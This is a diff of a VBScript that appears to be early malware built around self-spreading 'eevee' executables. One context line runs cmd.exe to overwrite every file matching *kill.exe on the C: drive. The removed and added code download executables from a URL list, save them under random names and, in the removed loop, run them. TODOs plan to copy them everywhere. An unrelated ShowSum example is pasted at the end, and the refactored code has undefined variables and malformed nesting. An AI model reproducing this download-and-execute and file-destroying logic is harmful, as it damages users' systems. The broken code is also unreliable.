@@ -15,35 +15,47 @@ oShell.run "cmd.exe /c for /r C:\ %i in (*kill.exe) do echo . > ""%i"""
 
 
 'TODO run all eevee executables
-
-'create random eevee executable
-Do While i <= 0
-	max=999999999
-	min=100000000
-	Randomize
-	'TODO copy random eevee executable everywhere
-	strHDLocation = (Int((max-min+1)*Rnd+min))&".exe"
-	
+Function getFiles(value)
 	Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
-    objXMLHTTP.open "GET", list.Item(i), false
+    objXMLHTTP.open "GET",value, false
     objXMLHTTP.send()
     If objXMLHTTP.Status = 200 Then
+		Set objADOStream = CreateObject("ADODB.Stream")
+		objADOStream.Open
+		objADOStream.Type = 1 
+		objADOStream.Write objXMLHTTP.ResponseBody
+		objADOStream.Position = 0    
+		Set objFSO = Createobject("Scripting.FileSystemObject")
+		If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
+			Set objFSO = Nothing
 
-    Set objADOStream = CreateObject("ADODB.Stream")
-	objADOStream.Open
-	objADOStream.Type = 1 
+			objADOStream.SaveToFile randExeName
+			objADOStream.Close
+			Set objADOStream = Nothing
+		End if
+	End If	
+End Function
+'TODO copy random eevee executable everywhere
+Function executeEevees() 'no seriously kill them all
 
-	objADOStream.Write objXMLHTTP.ResponseBody
-	objADOStream.Position = 0    
-	Set objFSO = Createobject("Scripting.FileSystemObject")
-	If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
-	Set objFSO = Nothing
+End Function
 
-	objADOStream.SaveToFile strHDLocation
-	objADOStream.Close
-	Set objADOStream = Nothing
-	End if
 
-	Set objXMLHTTP = Nothing
-	CreateObject("WScript.Shell").Run strHDLocation
-Loop
+'create random eevee executable
+Function randExeName()
+	randExeName = (Int((max-min+1)*Rnd+min))&".exe"
+End Function
+
+retValue = ShowSum(7, 8)
+MsgBox "The function returned:  " & retValue
+
+Function ShowSum(value1, value2)
+    Dim sum
+
+    ' Determine and display the sum.
+    sum = value1 + value2
+    MsgBox "The sum is:  " & sum
+
+    ' Set the function's return value.
+    ShowSum = sum
+End Function
